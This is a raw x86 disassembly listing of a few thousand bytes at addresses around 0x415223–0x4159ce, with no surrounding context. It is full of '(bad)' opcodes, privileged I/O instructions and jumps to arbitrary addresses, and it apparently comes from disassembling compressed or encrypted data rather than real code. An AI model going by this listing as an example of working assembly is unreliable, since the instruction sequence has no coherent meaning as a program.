  415223:	dec    esi
  415224:	sbb    ebx,DWORD PTR [ebx]
  415226:	jmp    0xfd737878
  41522b:	not    al
  41522d:	jge    0x4151c4
  41522f:	xchg   edx,eax
  415230:	(bad)  
  415231:	fist   WORD PTR [ebx+0x22b9f2fc]
  415237:	cld    
  415238:	(bad)  
  415239:	xor    ch,BYTE PTR [edx]
  41523b:	repnz push esp
  41523d:	fidiv  DWORD PTR [ebx+0x56]
  415240:	dec    esp
  415241:	mov    ebx,0x6a2da864
  415246:	fcmovu st,st(5)
  415248:	shl    DWORD PTR [ecx],0x8e
  41524b:	push   edi
  41524c:	lods   eax,DWORD PTR ds:[esi]
  41524d:	mov    ebp,0x6feb6633
  415252:	fcomp  st(6)
  415254:	retf   
  415255:	push   ebx
  415256:	int    0x45
  415258:	aad    0xe3
  41525a:	inc    ecx
  41525b:	dec    edx
  41525c:	popf   
  41525d:	push   edi
  41525e:	ds mov cl,0xb1
  415261:	cdq    
  415262:	sbb    DWORD PTR [ecx],edx
  415264:	xchg   DWORD PTR [edx-0xf],edi
  415267:	xlat   BYTE PTR ds:[ebx]
  415268:	ror    edi,0x13
  41526b:	adc    bh,bl
  41526d:	inc    edi
  41526e:	inc    ecx
  41526f:	xlat   BYTE PTR ds:[ebx]
  415270:	xor    eax,0xfa05a55c
  415275:	jbe    0x4152e9
  415277:	adc    al,0xde
  415279:	or     DWORD PTR [esi],esi
  41527b:	out    0xf0,al
  41527d:	fld    QWORD PTR [edx+ecx*2-0xc]
  415281:	adc    BYTE PTR [eax+0x36],dl
  415284:	dec    eax
  415285:	(bad)  
  415286:	mov    edi,0x8fa2419f
  41528b:	aad    0x37
  41528d:	pop    ebp
  41528e:	or     cl,BYTE PTR [esi+0x64c14970]
  415294:	out    dx,al
  415295:	jge    0x41527d
  415297:	ret    
  415298:	(bad)  
  415299:	push   edi
  41529a:	pop    esp
  41529b:	(bad)  
  41529c:	repnz pusha 
  41529e:	add    edi,DWORD PTR [edx+0xe]
  4152a1:	out    0x12,eax
  4152a3:	mov    al,cl
  4152a5:	push   cs
  4152a6:	jg     0x415298
  4152a8:	daa    
  4152a9:	push   edi
  4152aa:	adc    eax,0x90c9a0a3
  4152af:	fsub   DWORD PTR [edi-0x47]
  4152b2:	out    0x96,eax
  4152b4:	bnd js 0x41529d
  4152b7:	cmp    BYTE PTR [esi],al
  4152b9:	aam    0x85
  4152bb:	dec    esi
  4152bc:	xchg   ebp,eax
  4152bd:	(bad)  
  4152be:	leavew 
  4152c0:	xchg   edx,eax
  4152c1:	popf   
  4152c2:	scas   eax,DWORD PTR es:[edi]
  4152c3:	fld    DWORD PTR [esi-0x40]
  4152c6:	dec    esp
  4152c7:	or     BYTE PTR [ecx+0x7369c916],bl
  4152cd:	aad    0x7a
  4152cf:	jne    0x415333
  4152d1:	fdivrp st(7),st
  4152d3:	xor    DWORD PTR [ebp-0x26],esi
  4152d6:	and    ebp,eax
  4152d8:	push   ss
  4152d9:	add    ebx,eax
  4152db:	xor    ecx,DWORD PTR [eax+ebx*8+0x2]
  4152df:	imul   ebp,ebx,0xffffffb9
  4152e2:	adc    eax,0xff25ea55
  4152e7:	mov    ah,0x47
  4152e9:	pop    ds
  4152ea:	jecxz  0x41526f
  4152ec:	sbb    dl,dl
  4152ee:	and    dh,ah
  4152f0:	or     bl,BYTE PTR [ecx]
  4152f2:	adc    eax,0x219cd209
  4152f7:	nop
  4152f8:	inc    ebx
  4152f9:	and    BYTE PTR [esi+0x5958fa3d],cl
  4152ff:	or     eax,0xccafc9b4
  415304:	mov    edx,DWORD PTR [ebx-0xac27c20]
  41530a:	mov    ah,0x97
  41530c:	xchg   edi,eax
  41530d:	adc    eax,0x8f7a48cb
  415312:	sbb    eax,0x374f23a8
  415317:	into   
  415318:	jp     0x415326
  41531a:	pop    es
  41531b:	es jae 0x4152a5
  41531e:	jne    0x41533c
  415320:	and    eax,0xcd3a4d85
  415325:	or     al,0xd5
  415327:	iret   
  415328:	stc    
  415329:	test   eax,0x3455194
  41532e:	lods   eax,DWORD PTR ds:[esi]
  41532f:	pop    esp
  415330:	cmp    dl,BYTE PTR [edx-0x7040bbcb]
  415336:	xor    ecx,DWORD PTR [edi+0x3]
  415339:	push   eax
  41533a:	pop    ecx
  41533b:	mov    eax,0x72110454
  415340:	mov    edx,0x7de28c71
  415345:	call   0xd489ce3c
  41534a:	xchg   BYTE PTR [eax-0x70d32afe],cl
  415350:	scas   eax,DWORD PTR es:[edi]
  415351:	fmul   QWORD PTR [ebx+0x0]
  415354:	in     al,dx
  415355:	and    dl,BYTE PTR [ecx+ebp*4+0x20]
  415359:	or     eax,edx
  41535b:	inc    ecx
  41535c:	push   ss
  41535d:	imul   ecx,DWORD PTR [edi],0xf7f2650b
  415363:	je     0x4152fa
  415365:	hlt    
  415366:	sahf   
  415367:	lds    ebx,FWORD PTR [ebx-0x7b]
  41536a:	arpl   WORD PTR [edx+0x172bf191],di
  415370:	(bad)  
  415371:	in     al,0x29
  415373:	jmp    0x8ded:0x266aca54
  41537a:	pop    es
  41537b:	sbb    eax,0x4ad3c909
  415380:	mov    bl,BYTE PTR [esi+ebx*8-0x60]
  415384:	ret    0x49fd
  415387:	mov    edi,ebp
  415389:	adc    BYTE PTR [edi],0x7d
  41538c:	pop    esi
  41538d:	adc    BYTE PTR [ebp-0x59],ch
  415390:	push   cs
  415391:	pop    ecx
  415392:	or     al,0xf3
  415394:	jmp    0x24addc48
  415399:	mov    ds:0xed842c83,al
  41539e:	jl     0x415334
  4153a0:	popf   
  4153a1:	mov    ebx,0xffca2ba1
  4153a6:	pop    ecx
  4153a7:	xor    ch,dl
  4153a9:	adc    eax,0xd0f84967
  4153ae:	ds push esp
  4153b0:	ss jg  0x41537e
  4153b3:	(bad)  
  4153b4:	pusha  
  4153b5:	jg     0x415397
  4153b7:	jl     0x415412
  4153b9:	dec    eax
  4153ba:	jecxz  0x4153cf
  4153bc:	inc    ebx
  4153bd:	scas   eax,DWORD PTR es:[edi]
  4153be:	adc    al,0xd9
  4153c0:	data16 jnp 0x41538a
  4153c3:	mov    ds:0x7cdd7950,al
  4153c8:	repz daa 
  4153ca:	xchg   edi,eax
  4153cb:	mov    esp,0x2a2d1c61
  4153d0:	pop    ebp
  4153d1:	clc    
  4153d2:	add    eax,esi
  4153d4:	adc    eax,eax
  4153d6:	fdiv   QWORD PTR [ecx+0x29]
  4153d9:	ret    
  4153da:	ds dec esi
  4153dc:	dec    ecx
  4153dd:	fmul   QWORD PTR [esi+0x70]
  4153e0:	pushf  
  4153e1:	mov    WORD PTR [edi-0xc],es
  4153e4:	pop    esi
  4153e5:	jo     0x4153e5
  4153e7:	iret   
  4153e8:	je     0x4153b1
  4153ea:	bound  edi,QWORD PTR [esi+0x68]
  4153ed:	cli    
  4153ee:	ret    
  4153ef:	cmc    
  4153f0:	leave  
  4153f1:	imul   esp,eax,0x39c07045
  4153f7:	(bad)  
  4153f9:	lock cdq 
  4153fb:	fld    QWORD PTR [edx+0x4a]
  4153fe:	imul   esp,DWORD PTR [ebx],0xffffffbc
  415401:	outs   dx,DWORD PTR ds:[esi]
  415402:	out    0xba,al
  415404:	xor    eax,0x27b0c1ce
  415409:	jns    0x41540c
  41540b:	arpl   WORD PTR [edx+0x61],dx
  41540e:	push   ecx
  41540f:	xchg   DWORD PTR [ecx],eax
  415411:	les    eax,FWORD PTR [esi-0x76]
  415414:	retf   0x4a23
  415417:	test   DWORD PTR [ebp+0x44],edx
  41541a:	cmp    DWORD PTR [esp+esi*4],ebx
  41541d:	add    edi,0x23c03547
  415423:	mov    dl,0x72
  415425:	mov    WORD PTR [ecx],fs
  415427:	xchg   esi,eax
  415428:	jle    0x4154a4
  41542a:	retf   
  41542b:	add    edi,0x71
  41542e:	add    BYTE PTR [ebx+0x43],ch
  415431:	pop    ds
  415432:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415433:	aam    0xb8
  415435:	adc    eax,0xc37aa452
  41543a:	pop    es
  41543b:	stc    
  41543c:	adc    cl,BYTE PTR [ebx]
  41543e:	dec    edi
  41543f:	dec    esi
  415440:	mov    eax,ds:0xcdaace6a
  415445:	xchg   ebp,eax
  415446:	shl    BYTE PTR [esi],0x1f
  415449:	ins    DWORD PTR es:[edi],dx
  41544a:	fist   WORD PTR [eax+ecx*8]
  41544d:	daa    
  41544e:	cmp    edi,DWORD PTR [ecx]
  415450:	mov    BYTE PTR ss:[edx-0x2],dh
  415454:	dec    esi
  415455:	clc    
  415456:	and    eax,DWORD PTR [eax-0x2d1a8154]
  41545c:	fstp   TBYTE PTR [eax]
  41545e:	retf   
  41545f:	mov    al,ds:0xf2ec2f20
  415464:	pop    eax
  415465:	push   cs
  415466:	mov    bl,0x19
  415468:	inc    esi
  415469:	fsubr  DWORD PTR [ebp+ecx*2+0x746a6d2d]
  415470:	pop    edi
  415471:	add    dh,al
  415473:	std    
  415474:	add    eax,0xe3b9c086
  415479:	xorps  xmm7,XMMWORD PTR [edx+0x1b80de43]
  415480:	ins    BYTE PTR es:[edi],dx
  415481:	dec    ecx
  415482:	dec    esp
  415483:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415484:	mov    DWORD PTR [ebx+0x11a5fa1a],edi
  41548a:	jle    0x415443
  41548c:	dec    esi
  41548d:	aaa    
  41548e:	lahf   
  41548f:	jg     0x415443
  415491:	in     al,dx
  415492:	jmp    0x4154bc
  415494:	xor    al,0x42
  415496:	aaa    
  415497:	hlt    
  415498:	inc    edi
  415499:	popa   
  41549a:	(bad)  
  41549b:	pusha  
  41549c:	pop    esi
  41549d:	jp     0x4154dc
  41549f:	pop    edx
  4154a0:	jb     0x4154b7
  4154a2:	sub    dh,BYTE PTR [ebx]
  4154a4:	fs jmp 0x415479
  4154a7:	imul   edi,ebp,0x4d
  4154aa:	pop    edx
  4154ab:	xchg   edi,eax
  4154ac:	pop    edi
  4154ad:	cwde   
  4154ae:	call   DWORD PTR [ecx]
  4154b0:	or     esp,DWORD PTR [ebp+0x2ade771b]
  4154b6:	fdiv   st,st(0)
  4154b8:	mov    bl,0x90
  4154ba:	xchg   edx,eax
  4154bb:	inc    ebp
  4154bc:	pop    eax
  4154bd:	xchg   edx,eax
  4154be:	je     0x415484
  4154c0:	popa   
  4154c1:	dec    esi
  4154c2:	inc    ebp
  4154c3:	mov    ecx,0x64424f17
  4154c8:	cmp    esp,ebp
  4154ca:	std    
  4154cb:	dec    eax
  4154cc:	int3   
  4154cd:	aad    0x38
  4154cf:	pop    ebx
  4154d0:	daa    
  4154d1:	cld    
  4154d2:	iret   
  4154d3:	mov    eax,ds:0x28ee4b76
  4154d8:	xchg   ebx,eax
  4154d9:	mov    ds:0x826bdc1d,eax
  4154de:	mov    al,ds:0x70181398
  4154e3:	pop    ecx
  4154e4:	scas   al,BYTE PTR es:[edi]
  4154e5:	and    DWORD PTR [ebx],esi
  4154e7:	xor    DWORD PTR [edi+0x4a1ce62d],edi
  4154ed:	cli    
  4154ee:	adc    dl,bl
  4154f0:	aaa    
  4154f1:	mov    edx,DWORD PTR [edx+0x22]
  4154f4:	fild   WORD PTR [ecx+eax*1+0x439db8ae]
  4154fb:	retf   
  4154fc:	out    0xac,al
  4154fe:	fild   QWORD PTR [eax+eiz*1+0x10]
  415502:	jns    0x41551d
  415504:	pop    eax
  415505:	call   0xe6f4:0xe827535c
  41550c:	push   ecx
  41550d:	fs mov eax,0x8f70ca6
  415513:	pop    ecx
  415514:	pop    esp
  415515:	repz push ecx
  415517:	mov    bh,0xfc
  415519:	hlt    
  41551a:	out    dx,al
  41551b:	mov    edi,0xb1632878
  415520:	and    eax,0x85bffb61
  415525:	add    eax,0xfff23205
  41552a:	pop    esp
  41552b:	mov    ecx,0xae95461d
  415530:	jle    0x41552c
  415532:	xchg   esi,eax
  415533:	pop    ecx
  415534:	pusha  
  415535:	enter  0x2c9,0xa4
  415539:	call   0x30dc8bd9
  41553e:	sbb    eax,0xd1a6e0e7
  415543:	ja     0x4155ae
  415545:	or     ebp,DWORD PTR [esi]
  415547:	addr16 pop ebx
  415549:	jecxz  0x4155c0
  41554b:	je     0x41556f
  41554d:	imul   ebp,DWORD PTR [ecx],0x24
  415550:	lods   eax,DWORD PTR ds:[esi]
  415551:	aam    0xde
  415553:	or     eax,0x57d21fbd
  415558:	xchg   esi,eax
  415559:	loopne 0x415510
  41555b:	out    dx,al
  41555c:	aaa    
  41555d:	push   esp
  41555e:	push   edx
  41555f:	dec    ebx
  415560:	jg     0x415550
  415562:	in     al,0x5d
  415564:	jno    0x415519
  415566:	test   al,0x21
  415568:	aas    
  415569:	pop    ss
  41556a:	cmp    ah,dl
  41556c:	js     0x41551e
  41556e:	and    BYTE PTR [ebx],dl
  415570:	pop    esp
  415571:	arpl   WORD PTR [ecx-0x69e53dba],di
  415577:	not    BYTE PTR [edi+0x7d]
  41557a:	inc    edx
  41557b:	aad    0x66
  41557d:	xchg   edx,eax
  41557e:	repz sub esp,DWORD PTR [edi+0x78]
  415582:	jno    0x415516
  415584:	xchg   DWORD PTR [edx+0x41903080],ebp
  41558a:	lods   eax,DWORD PTR ds:[esi]
  41558b:	jmp    DWORD PTR [edx+eiz*1-0x4d]
  41558f:	mov    bl,0xca
  415591:	mov    al,ds:0x7d682433
  415596:	sub    cl,BYTE PTR [edx]
  415598:	mov    ch,0xde
  41559a:	test   BYTE PTR [edx-0x3b5b99f2],0x28
  4155a1:	das    
  4155a2:	popf   
  4155a3:	push   0xbb0663ed
  4155a8:	and    eax,DWORD PTR [esi]
  4155aa:	mov    bl,0x5d
  4155ac:	test   al,0xa8
  4155ae:	test   al,0xc5
  4155b0:	mov    ebp,0x1f4481b2
  4155b5:	add    dh,BYTE PTR [eax-0x14e3b485]
  4155bb:	aad    0x26
  4155bd:	mov    ds:0xf48a9e8,eax
  4155c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4155c3:	call   0xfdfe:0xd5ef93d4
  4155ca:	sub    al,0x6c
  4155cc:	push   ecx
  4155cd:	push   edi
  4155ce:	test   eax,0x4a921ee6
  4155d3:	add    BYTE PTR [eax+0x1a],ch
  4155d6:	aas    
  4155d7:	and    al,BYTE PTR [ecx+edx*2]
  4155da:	mov    DWORD PTR [eax-0x383eb425],edx
  4155e0:	cmp    eax,0xfee1df9b
  4155e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4155e6:	aas    
  4155e7:	add    ah,al
  4155e9:	add    al,ah
  4155eb:	outs   dx,DWORD PTR ds:[esi]
  4155ec:	bound  eax,QWORD PTR [ebp+0x2a]
  4155ef:	xor    cl,BYTE PTR [edi+edx*1]
  4155f2:	pop    edx
  4155f3:	jnp    0x4155d1
  4155f5:	sub    cl,ch
  4155f7:	leave  
  4155f8:	cli    
  4155f9:	mov    edi,0xd8875143
  4155fe:	inc    edi
  4155ff:	das    
  415600:	or     eax,0xf40acad0
  415605:	int    0x72
  415607:	push   cs
  415608:	sub    cl,BYTE PTR [esi-0x47]
  41560b:	jae    0x4155d4
  41560d:	ins    DWORD PTR es:[edi],dx
  41560e:	adc    BYTE PTR [ebx*2+0x15f2f3de],0x4d
  415616:	jmp    0x415654
  415618:	push   0xffffffc2
  41561a:	repz jae 0x415694
  41561d:	retf   
  41561e:	xchg   edi,eax
  41561f:	jb     0x415677
  415621:	inc    ebx
  415622:	push   0x3f
  415624:	inc    esp
  415625:	repnz pop es
  415627:	push   ebx
  415628:	test   eax,0xc9e3429e
  41562d:	xor    ch,dl
  41562f:	cmc    
  415630:	inc    edi
  415631:	or     BYTE PTR [edi-0x23],dh
  415634:	add    ebx,edx
  415636:	jle    0x41564d
  415638:	add    esi,edx
  41563a:	retf   
  41563b:	test   al,0x8a
  41563d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41563e:	enterw 0x83,0x6f
  415643:	cmp    cl,BYTE PTR [ecx+0x4b]
  415646:	shl    edi,cl
  415648:	icebp  
  415649:	pop    ebx
  41564a:	xchg   ebp,eax
  41564b:	orps   xmm6,XMMWORD PTR [ecx+0x13]
  41564f:	stc    
  415650:	ror    BYTE PTR [ecx+0x1ff03902],cl
  415656:	dec    esp
  415657:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415658:	repz cmc 
  41565a:	(bad)  
  41565b:	mov    ah,0xc9
  41565d:	mov    ax,WORD PTR [edi-0x8e48e15]
  415664:	and    eax,0x6431a548
  415669:	retf   0xe203
  41566c:	mov    ecx,0x7d0ff29a
  415671:	inc    edi
  415672:	xlat   BYTE PTR ds:[ebx]
  415673:	shr    BYTE PTR [eax+0x46],1
  415676:	(bad)  
  415677:	bound  ecx,QWORD PTR [eax-0x2a]
  41567a:	outs   dx,BYTE PTR ds:[esi]
  41567b:	inc    ebx
  41567c:	inc    esi
  41567d:	or     eax,DWORD PTR [ebp+0x541693c6]
  415683:	pop    esp
  415684:	outs   dx,BYTE PTR ds:[esi]
  415685:	mov    ecx,DWORD PTR [edi]
  415687:	fst    QWORD PTR [eax+0x5]
  41568a:	mov    ch,0x60
  41568c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41568d:	push   ecx
  41568e:	fnsave [eax+0x4d]
  415691:	pop    ss
  415692:	push   0xec4b690f
  415697:	jmp    0x4bd1:0x2e667eee
  41569e:	imul   edi,DWORD PTR [edi-0x5c],0xb0d904f7
  4156a5:	cmp    bh,dh
  4156a7:	cmp    ah,BYTE PTR [bp-0x7664]
  4156ac:	mov    esp,ecx
  4156ae:	test   BYTE PTR [ebx-0x32],0x78
  4156b2:	inc    edi
  4156b3:	jbe    0x415686
  4156b5:	inc    ebx
  4156b6:	pop    edi
  4156b7:	sub    ch,BYTE PTR [eax-0x32]
  4156ba:	pop    eax
  4156bb:	push   0x98036739
  4156c0:	gs jmp 0x41570d
  4156c3:	js     0x415695
  4156c5:	cmc    
  4156c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4156c7:	xlat   BYTE PTR ds:[ebx]
  4156c8:	mov    eax,0xd1cb51cf
  4156cd:	iret   
  4156ce:	jne    0x41570f
  4156d0:	mov    cl,al
  4156d2:	push   0xffffff91
  4156d4:	outs   dx,BYTE PTR ds:[esi]
  4156d5:	push   ebx
  4156d6:	lock sub DWORD PTR [edi-0x7b],0xf155acc
  4156de:	mov    esi,0x5c560d01
  4156e3:	cmp    BYTE PTR [edi],al
  4156e5:	cdq    
  4156e6:	scas   al,BYTE PTR es:[edi]
  4156e7:	shr    BYTE PTR [eax-0x56],0x4f
  4156eb:	rcr    BYTE PTR [eax+0x3bee4b69],0xa1
  4156f2:	ucomiss xmm5,xmm2
  4156f5:	mov    bh,0xfc
  4156f7:	mov    eax,ds:0xe426cc1e
  4156fc:	sub    bh,BYTE PTR [ebx+0x74]
  4156ff:	aas    
  415700:	pusha  
  415701:	xchg   esp,eax
  415702:	dec    ecx
  415703:	push   eax
  415704:	xchg   esi,eax
  415705:	lods   al,BYTE PTR ds:[esi]
  415706:	sub    al,0x1f
  415708:	adc    ah,bh
  41570a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41570b:	mov    cs,edi
  41570d:	in     al,dx
  41570e:	fistp  DWORD PTR [edx+0x2d]
  415711:	jbe    0x415717
  415713:	jg     0x4156bb
  415715:	xlat   BYTE PTR ds:[ebx]
  415716:	(bad)  
  415717:	mov    ecx,0x2962f3ca
  41571c:	jne    0x415754
  41571e:	mov    ah,0x8c
  415720:	adc    cl,al
  415722:	push   ecx
  415723:	retf   
  415724:	or     bh,BYTE PTR [ecx+edx*4]
  415727:	mov    dl,0x47
  415729:	pop    ecx
  41572a:	in     al,0x32
  41572c:	sub    ah,ah
  41572e:	inc    ebp
  41572f:	and    DWORD PTR [ebp-0x4107e011],0xffffffbc
  415736:	add    ch,cl
  415738:	mov    WORD PTR [ebx+0xf],?
  41573b:	sbb    eax,0x34f54824
  415740:	mov    edx,0x669fa3ee
  415745:	pop    es
  415746:	jb     0x4156ef
  415748:	sub    al,0x0
  41574a:	cdq    
  41574b:	sub    BYTE PTR [ebp-0x5d],ch
  41574e:	jne    0x4156ff
  415750:	jns    0x41571a
  415752:	cmp    cl,0xcf
  415755:	lahf   
  415756:	mov    ah,0xdb
  415758:	xchg   ebx,eax
  415759:	inc    edi
  41575a:	add    dl,BYTE PTR [ecx-0xb]
  41575d:	sub    DWORD PTR gs:[esi],ecx
  415760:	sbb    ecx,DWORD PTR [edx]
  415762:	xor    BYTE PTR [edx+0x20],0x3c
  415766:	test   al,0xb1
  415768:	out    dx,eax
  415769:	jae    0x4157be
  41576b:	enter  0x53f,0xf1
  41576f:	sbb    al,0xa2
  415771:	js     0x4157ab
  415773:	pusha  
  415774:	int3   
  415775:	mov    BYTE PTR [edx-0x561f8de7],ch
  41577b:	je     0x41573a
  41577d:	icebp  
  41577e:	mov    al,ds:0xe33ff3b9
  415783:	or     BYTE PTR [esi-0x2ac39b9a],dl
  415789:	inc    esp
  41578a:	loope  0x415794
  41578c:	sub    esi,DWORD PTR [ebx-0x4e]
  41578f:	mov    edi,gs
  415791:	inc    edx
  415792:	sti    
  415793:	out    dx,eax
  415794:	jne    0x4157dd
  415796:	jns    0x41576f
  415798:	test   al,0x92
  41579a:	xor    esi,0xffffffaa
  41579d:	imul   esp,DWORD PTR [esi],0xfbcbdee9
  4157a3:	jmp    0x415736
  4157a5:	push   0x52
  4157a7:	push   es
  4157a8:	imul   edx,DWORD PTR [ebp-0x31],0x7129d8b2
  4157af:	in     eax,dx
  4157b0:	cwde   
  4157b1:	lea    eax,ds:0x2685f92d
  4157b7:	out    0x33,al
  4157b9:	out    0x43,al
  4157bb:	jbe    0x4157c6
  4157bd:	pop    ss
  4157be:	repnz sahf 
  4157c0:	xchg   DWORD PTR [ecx+ebp*8+0x5c],edi
  4157c4:	sti    
  4157c5:	outs   dx,BYTE PTR ds:[esi]
  4157c6:	xor    BYTE PTR [ebp+eax*8+0x7c072303],dh
  4157cd:	(bad)  
  4157ce:	sti    
  4157cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4157d0:	retf   
  4157d1:	iret   
  4157d2:	xchg   esp,eax
  4157d3:	popf   
  4157d4:	xchg   DWORD PTR [eax],esi
  4157d6:	jbe    0x41581f
  4157d8:	repnz xchg edi,eax
  4157da:	push   0xb02568ee
  4157df:	jae    0x415832
  4157e1:	dec    edi
  4157e2:	int    0x42
  4157e4:	lds    esp,FWORD PTR [esp+ecx*8+0x10]
  4157e8:	jb     0x4157c6
  4157ea:	loope  0x4157a1
  4157ec:	sub    ecx,DWORD PTR [eax+0x4f]
  4157ef:	shl    BYTE PTR [esi-0x54],1
  4157f2:	and    dl,BYTE PTR [eax-0x40]
  4157f5:	push   eax
  4157f6:	inc    ebp
  4157f7:	and    ch,BYTE PTR [eax-0x26]
  4157fa:	jmp    DWORD PTR [ebx+edi*1+0x35]
  4157fe:	or     ecx,ebp
  415800:	sub    eax,0x938000af
  415805:	push   0x3a8d1d2f
  41580a:	enter  0x55ee,0xf6
  41580e:	ins    DWORD PTR es:[edi],dx
  41580f:	mov    esp,0xa23eaa0a
  415814:	ins    DWORD PTR es:[edi],dx
  415815:	fiadd  DWORD PTR [edx-0x1e]
  415818:	or     eax,DWORD PTR [edx+0x7fe571c5]
  41581e:	inc    esi
  41581f:	jp     0x415883
  415821:	fisttp QWORD PTR [edx-0x1e66a387]
  415827:	push   0x11
  415829:	jg     0x41586e
  41582b:	repnz mov esi,0x10c03b5e
  415831:	ins    BYTE PTR es:[edi],dx
  415832:	sub    ebp,edx
  415834:	or     eax,0xba9c1d30
  415839:	add    al,dl
  41583b:	(bad)  
  41583c:	cmp    BYTE PTR [esi-0x8e2e24c],bh
  415842:	sub    al,0x9a
  415844:	cli    
  415845:	ret    0xbdc0
  415848:	mov    cl,0xc6
  41584a:	or     BYTE PTR [edi-0xa],dh
  41584d:	imul   edi,esi,0x53
  415850:	xchg   edx,eax
  415851:	sub    eax,0x914a0b56
  415856:	mov    al,al
  415858:	dec    ecx
  415859:	dec    eax
  41585a:	and    eax,0xef5a192d
  41585f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415860:	jmp    0x4157e7
  415862:	or     ebx,DWORD PTR [ebx-0x1fc19942]
  415868:	pop    ebp
  415869:	ret    0x9076
  41586c:	or     eax,0x6e2f90e3
  415871:	push   esi
  415872:	cwde   
  415873:	cmp    esp,DWORD PTR [eax-0x78]
  415876:	push   ebx
  415877:	clc    
  415878:	lods   al,BYTE PTR ds:[esi]
  415879:	and    eax,0xdbba2e33
  41587e:	stos   DWORD PTR es:[edi],eax
  41587f:	in     eax,dx
  415880:	ss pushf 
  415882:	popf   
  415883:	adc    dl,BYTE PTR [eax-0x2ecf2096]
  415889:	fisttp WORD PTR gs:[eax-0x56]
  41588d:	and    BYTE PTR [eax],dh
  41588f:	aad    0xce
  415891:	or     al,0x78
  415893:	and    bl,cl
  415895:	jle    0x41585c
  415897:	fnstsw WORD PTR [edx+0x75]
  41589a:	jg     0x415916
  41589c:	jmp    0x41586e
  41589e:	or     esp,DWORD PTR [ebx]
  4158a0:	into   
  4158a1:	sbb    al,0xbf
  4158a3:	loope  0x415884
  4158a5:	sahf   
  4158a6:	daa    
  4158a7:	hlt    
  4158a8:	pop    ebx
  4158a9:	cmp    al,0x54
  4158ab:	or     eax,0x149ac874
  4158b0:	mov    esp,0x123c9a40
  4158b5:	sub    DWORD PTR [esi],esp
  4158b7:	jae    0x41591b
  4158b9:	jl     0x41584a
  4158bb:	(bad)  
  4158bc:	push   0x7a
  4158be:	and    BYTE PTR [ebx+0x4de6b6f1],0x63
  4158c5:	push   edx
  4158c6:	sub    al,0xf1
  4158c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4158c9:	mov    ebx,0x8ca14f87
  4158ce:	adc    al,0x9e
  4158d0:	push   ds
  4158d1:	sub    DWORD PTR [edi-0x3607011f],ecx
  4158d7:	fdivr  DWORD PTR [ecx-0x7d]
  4158da:	inc    esp
  4158db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4158dc:	xchg   ebp,eax
  4158dd:	pop    ecx
  4158de:	mov    BYTE PTR [ebx],bl
  4158e0:	icebp  
  4158e1:	fldcw  WORD PTR [edi+0x66]
  4158e4:	mov    esp,0xeea6f4f9
  4158e9:	inc    esi
  4158ea:	shl    cl,1
  4158ec:	sbb    al,0x8f
  4158ee:	js     0x4158b0
  4158f0:	repz and DWORD PTR [ebp+0x16304365],ecx
  4158f7:	rol    bl,0x9b
  4158fa:	push   0x9550d549
  4158ff:	scas   eax,DWORD PTR es:[edi]
  415900:	jl     0x4158a1
  415902:	imul   ebx,DWORD PTR [ebx-0x4b],0xbc82e825
  415909:	lea    esi,[ebx]
  41590b:	jl     0x41595b
  41590d:	sub    eax,ebp
  41590f:	cmc    
  415910:	lea    esp,[edx+0x4b]
  415913:	mov    bl,BYTE PTR [eax+0x6d42536]
  415919:	test   DWORD PTR [esi+0x6f10a8a3],0xe06fdf00
  415923:	sbb    DWORD PTR [edi+0x4aa6fef9],ecx
  415929:	pusha  
  41592a:	iret   
  41592b:	inc    esp
  41592c:	push   ebp
  41592d:	addr16 sbb al,0x7
  415930:	gs ret 
  415932:	outs   dx,BYTE PTR ds:[esi]
  415933:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415934:	add    DWORD PTR [esi-0x7f],ebp
  415937:	inc    edi
  415938:	dec    ecx
  415939:	(bad)  
  41593b:	adc    eax,0xbcc8401f
  415940:	adc    BYTE PTR [ecx-0x3b],bh
  415943:	ja     0x4159c4
  415945:	push   esp
  415946:	fld    QWORD PTR [esi+0x5c154d27]
  41594c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41594d:	lds    esp,FWORD PTR [ebx-0x7a]
  415950:	mov    bh,0x5d
  415952:	int3   
  415953:	cmp    eax,esp
  415955:	arpl   WORD PTR [edi-0x7c],di
  415958:	pop    ebx
  415959:	push   ds
  41595a:	and    eax,DWORD PTR [eax+0x7b170165]
  415960:	sar    eax,cl
  415962:	rcl    DWORD PTR [ecx+0x51],cl
  415965:	pop    edx
  415966:	pop    esp
  415967:	neg    BYTE PTR [eax+ecx*4-0x7a522323]
  41596e:	sub    eax,DWORD PTR [ebx+0x5793e61f]
  415974:	push   ds
  415975:	lods   eax,DWORD PTR ds:[esi]
  415976:	xlat   BYTE PTR ds:[ebx]
  415977:	push   esi
  415978:	xchg   DWORD PTR [edx],eax
  41597a:	pop    ds
  41597b:	neg    dh
  41597d:	ds sbb eax,0x66129c59
  415983:	mov    BYTE PTR [ebx],al
  415985:	sbb    BYTE PTR [eax-0x203b3175],dl
  41598b:	mov    ds:0x9551b5b,eax
  415990:	mov    ecx,0xff12d668
  415995:	or     BYTE PTR [esi],ah
  415997:	jmp    edx
  415999:	sub    ebp,ebx
  41599b:	mov    cl,0x82
  41599d:	lahf   
  41599e:	ins    BYTE PTR es:[edi],dx
  41599f:	jno    0x4159d9
  4159a1:	das    
  4159a2:	retf   
  4159a3:	pop    es
  4159a4:	mov    ebp,0xdb844c33
  4159a9:	cs je  0x41596a
  4159ac:	push   cs
  4159ad:	fdivr  DWORD PTR [eax-0x37]
  4159b0:	xor    edi,esp
  4159b2:	and    ecx,DWORD PTR [ebp+0x53]
  4159b5:	bound  esp,QWORD PTR [edx-0x5f]
  4159b8:	mov    ebx,DWORD PTR [ebx]
  4159ba:	mov    esp,0x687bba8e
  4159bf:	aad    0xca
  4159c1:	sbb    al,0x66
  4159c3:	mov    edi,0xcfeb576b
  4159c8:	sub    eax,0xe5afe065
  4159cd:	(bad)  
  4159ce:	pushf  
